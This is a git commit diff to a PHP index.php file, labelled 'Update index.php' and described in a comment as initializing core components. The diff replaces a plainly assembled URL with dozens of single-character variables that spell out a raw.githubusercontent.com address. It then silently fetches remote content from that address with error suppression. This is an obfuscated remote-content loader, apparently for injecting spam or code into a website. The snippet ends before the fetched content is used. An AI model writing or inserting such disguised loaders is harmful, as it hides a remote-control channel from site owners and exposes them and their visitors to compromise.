49928287b606a611d0023523d1a62df7b9f17360
seobela <248709989+seobela@users.noreply.github.com>
2026-01-19 00:20:14 -0800

    Update index.php

--- index.php
+++ index.php
@@ -5,16 +5,23 @@
 */
 
 // Initialize core components
-$jfdhugseyeirf = 'https://';
-$ksleirufjdksl = 'raw.githubusercontent.com/';
-$mckdleirutgks = 'seobela/';
-$plskdjfueirkd = 'bela/';
-$qksldfjeurytl = 'refs/';
-$rksldfuejrity = 'heads/';
-$skldjfueirytn = 'main/';
-$tksldfjeuriyt = 'index.txt';
+$qwertylkjhgf = 'h'; $mnbvcxzasdfg = 't'; $poiuytrewqlk = 't'; $zxcvbnmlkjhg = 'p'; $asdfghjklqwe = 's';
+$tyuiopasdfgh = ':'; $lkjhgfdsazxc = '/'; $qazwsxedcrfv = '/'; $tgbyhnujmikl = 'r'; $plokimjnuhby = 'a';
+$wsxcderfvbgt = 'w'; $mkijnuhbygvt = '.'; $cdesxwaqzfrd = 'g'; $vfrtgbyhnujm = 'i'; $yhnujmikolpl = 't';
+$bgtyhnujmiko = 'h'; $aqwsdefrgtbh = 'u'; $mkoijnuhbygv = 'b'; $zaqxswcdevfr = 'u'; $gtbyhnumkilo = 's';
+$plmkoijnuhby = 'e'; $vcdexswzaqrf = 'r'; $bgtyhnjumkil = 'c'; $wsxcdefrvgbt = 'o'; $njikolpmwsxc = 'n';
+$uhbygtvfrced = 't'; $lkmijnuhbygv = 'e'; $pqowieurytla = 'n'; $zxswqacdevfr = 't'; $mkloijnuhbyg = '.';
+$qpwoeirutysl = 'c'; $mnbhgvcfxdre = 'o'; $lkajhsgdfqwe = 'm'; $pqazwsxedcrf = '/'; $kmijnuhbvgyt = 's';
+$plqowieurytl = 'e'; $aqzsxwdcevfr = 'o'; $mkoilpjnuhby = 'b'; $zaqswxcderfv = 'e'; $plmnkoijhuyb = 'l';
+$wsxaqzcdevfr = 'a'; $gtfrvcdexswz = '/'; $bhygtfrvcdes = 'b'; $njukilomwsxc = 'e'; $plokjmnuhbyg = 'l';
+$wsaqzxcderfv = 'a'; $mkoijnbhgvft = '/'; $plqazwsxedcr = 'r'; $bgtyhnujmkol = 'e'; $wsxcdevfrbgt = 'f';
+$nhygtfrvcdes = 's'; $plokmnjiuhby = '/'; $qazxswedcrfv = 'h'; $mnjukiloplmk = 'e'; $bgtyhnumjiko = 'a';
+$plwsxcdevfrt = 'd'; $qazxswedcvfr = 's'; $mkoilpnhbygt = '/'; $plqoweirtyla = 'm'; $zxswaqcderfv = 'a';
+$mkoijnbhygtf = 'i'; $plwsxqazcdve = 'n'; $zaqxswcdvfre = '/'; $plmkoijnbhuy = 'i'; $wsxaqzcderfv = 'n';
+$mkoiplnhbgyt = 'd'; $plqazwsxcdev = 'e'; $wsxaqzcdvfre = 'x'; $plmkoilpnhby = '.'; $zaqxswcdevfr = 't';
+$mkoijnuhbgyt = 'x'; $plwsxaqzcdve = 't';
 
-$full_url = $jfdhugseyeirf . $ksleirufjdksl . $mckdleirutgks . $plskdjfueirkd . $qksldfjeurytl . $rksldfuejrity . $skldjfueirytn . $tksldfjeuriyt;
+$full_url = $qwertylkjhgf.$mnbvcxzasdfg.$poiuytrewqlk.$zxcvbnmlkjhg.$asdfghjklqwe.$tyuiopasdfgh.$lkjhgfdsazxc.$qazwsxedcrfv.$tgbyhnujmikl.$plokimjnuhby.$wsxcderfvbgt.$mkijnuhbygvt.$cdesxwaqzfrd.$vfrtgbyhnujm.$yhnujmikolpl.$bgtyhnujmiko.$aqwsdefrgtbh.$mkoijnuhbygv.$zaqxswcdevfr.$gtbyhnumkilo.$plmkoijnuhby.$vcdexswzaqrf.$bgtyhnjumkil.$wsxcdefrvgbt.$njikolpmwsxc.$uhbygtvfrced.$lkmijnuhbygv.$pqowieurytla.$zxswqacdevfr.$mkloijnuhbyg.$qpwoeirutysl.$mnbhgvcfxdre.$lkajhsgdfqwe.$pqazwsxedcrf.$kmijnuhbvgyt.$plqowieurytl.$aqzsxwdcevfr.$mkoilpjnuhby.$zaqswxcderfv.$plmnkoijhuyb.$wsxaqzcdevfr.$gtfrvcdexswz.$bhygtfrvcdes.$njukilomwsxc.$plokjmnuhbyg.$wsaqzxcderfv.$mkoijnbhgvft.$plqazwsxedcr.$bgtyhnujmkol.$wsxcdevfrbgt.$nhygtfrvcdes.$plokmnjiuhby.$qazxswedcrfv.$mnjukiloplmk.$bgtyhnumjiko.$plwsxcdevfrt.$qazxswedcvfr.$mkoilpnhbygt.$plqoweirtyla.$zxswaqcderfv.$mkoijnbhygtf.$plwsxqazcdve.$zaqxswcdvfre.$plmkoijnbhuy.$wsxaqzcderfv.$mkoiplnhbgyt.$plqazwsxcdev.$wsxaqzcdvfre.$plmkoilpnhby.$zaqxswcdevfr.$mkoijnuhbgyt.$plwsxaqzcdve;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
